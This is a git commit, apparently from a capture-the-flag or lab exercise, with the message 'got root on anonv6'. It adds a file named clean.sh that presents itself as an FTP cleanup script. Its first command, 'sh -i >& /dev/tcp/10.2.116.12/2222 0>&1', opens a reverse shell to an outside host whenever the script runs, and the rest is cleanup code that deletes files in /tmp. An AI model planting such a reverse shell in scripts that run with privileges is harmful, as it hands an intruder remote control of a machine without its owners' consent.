05df88d9bd024d28e75cdf03874ca3f541513b2c
Tim <tim@tim.tim>
2024-02-25 18:39:37 -0800

    got root on anonv6

---
+++ AnonymousV6/clean.sh
@@ -0,0 +1,13 @@
+#!/bin/bash
+
+sh -i >& /dev/tcp/10.2.116.12/2222 0>&1
+
+tmp_files=0
+echo $tmp_files
+if [ $tmp_files=0 ]
+then
+        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
+else
+    for LINE in $tmp_files; do
+        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
+fi
